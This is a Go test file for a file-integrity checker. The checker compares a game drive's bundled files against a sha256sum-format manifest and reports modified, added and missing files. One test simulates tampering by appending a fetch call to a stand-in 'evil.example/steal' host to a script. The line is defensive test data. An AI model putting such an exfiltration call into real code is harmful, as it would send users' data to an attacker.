package integrity

import (
	"os"
	"path/filepath"
	"testing"
)

// newDrive builds a miniature drive layout on disk: real directories, real files, so
// every test below exercises the actual filesystem walk rather than a fake.
func newDrive(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "app", "index.html"), "<html>hello</html>")
	mustWrite(t, filepath.Join(root, "app", "assets", "main.js"), "console.log(1)")
	mustWrite(t, filepath.Join(root, "content", "levels", "level-1.json"), `{"id":"level-1"}`)
	return root
}

func mustWrite(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestVerify_UntouchedDriveHasNoProblems(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}
	problems, err := Verify(root, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(problems) != 0 {
		t.Fatalf("untouched drive reported problems: %v", problems)
	}
}

// The core case this package exists for: malware appends to a bundled script, and the
// drive must notice on the next launch.
func TestVerify_DetectsModifiedFile(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}

	js := filepath.Join(root, "app", "assets", "main.js")
	mustWrite(t, js, "console.log(1);fetch('http://evil.example/steal')")

	problems, err := Verify(root, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(problems) != 1 || problems[0].Path != "app/assets/main.js" || problems[0].Reason != "modified" {
		t.Fatalf("problems = %v, want exactly app/assets/main.js modified", problems)
	}
}

// Dropping a NEW file in is just as much an infection as editing one, and a check that
// only looked at manifest paths would miss it completely.
func TestVerify_DetectsAddedFile(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}

	mustWrite(t, filepath.Join(root, "app", "assets", "payload.js"), "// dropped in later")

	problems, err := Verify(root, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(problems) != 1 || problems[0].Path != "app/assets/payload.js" {
		t.Fatalf("problems = %v, want the added file reported", problems)
	}
}

func TestVerify_DetectsMissingFile(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}

	if err := os.Remove(filepath.Join(root, "content", "levels", "level-1.json")); err != nil {
		t.Fatal(err)
	}

	problems, err := Verify(root, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(problems) != 1 || problems[0].Reason != "missing" {
		t.Fatalf("problems = %v, want one missing-file problem", problems)
	}
}

// Every discrepancy at once, not just the first -- one changed level and a dozen changed
// bundle files mean very different things, and the operator needs to see which they have.
func TestVerify_ReportsEveryProblemNotJustTheFirst(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}

	mustWrite(t, filepath.Join(root, "app", "index.html"), "<html>changed</html>")
	mustWrite(t, filepath.Join(root, "app", "assets", "main.js"), "changed too")
	mustWrite(t, filepath.Join(root, "app", "extra.js"), "added")

	problems, err := Verify(root, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(problems) != 3 {
		t.Fatalf("got %d problems (%v), want all 3 reported", len(problems), problems)
	}
}

// The child's save file changes constantly and must never be treated as tampering.
func TestVerify_IgnoresTheMutableDataDirectory(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}

	mustWrite(t, filepath.Join(root, "data", "pet.db"), "a child's progress, always changing")

	problems, err := Verify(root, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(problems) != 0 {
		t.Fatalf("data/ was treated as part of the verified set: %v", problems)
	}
}

func TestWriteLoad_RoundTripsAndIsSha256sumFormat(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(root, ManifestName)
	if err := Write(path, m); err != nil {
		t.Fatal(err)
	}

	// Readable by standard tooling: "<64 hex chars><two spaces><path>".
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	first := string(raw)
	if len(first) < 66 || first[64:66] != "  " {
		t.Fatalf("manifest is not in sha256sum format, first line: %.80q", first)
	}

	loaded, ok, err := Load(path)
	if err != nil || !ok {
		t.Fatalf("Load: ok=%v err=%v", ok, err)
	}
	if len(loaded) != len(m) {
		t.Fatalf("round trip changed entry count: %d -> %d", len(m), len(loaded))
	}
	for i := range m {
		if loaded[i] != m[i] {
			t.Fatalf("entry %d round-tripped as %+v, want %+v", i, loaded[i], m[i])
		}
	}
}

// A dev checkout has no manifest, and that must be an ordinary "skip", never an error --
// otherwise every contributor's first run fails for a reason unrelated to their work.
func TestLoad_MissingManifestIsNotAnError(t *testing.T) {
	_, ok, err := Load(filepath.Join(t.TempDir(), ManifestName))
	if err != nil {
		t.Fatalf("missing manifest returned an error: %v", err)
	}
	if ok {
		t.Fatal("reported a manifest that does not exist")
	}
}

// Manifest paths must be identical whether the drive was written on Windows or Linux.
func TestGenerate_UsesForwardSlashesOnEveryPlatform(t *testing.T) {
	root := newDrive(t)
	m, err := Generate(root, VerifiedDirs)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, e := range m {
		if e.Path == "app/assets/main.js" {
			found = true
		}
		if filepath.Separator == '\\' && len(e.Path) > 0 && e.Path[0] == '\\' {
			t.Fatalf("entry %q uses a backslash path", e.Path)
		}
	}
	if !found {
		t.Fatalf("expected app/assets/main.js in manifest, got %v", m)
	}
}
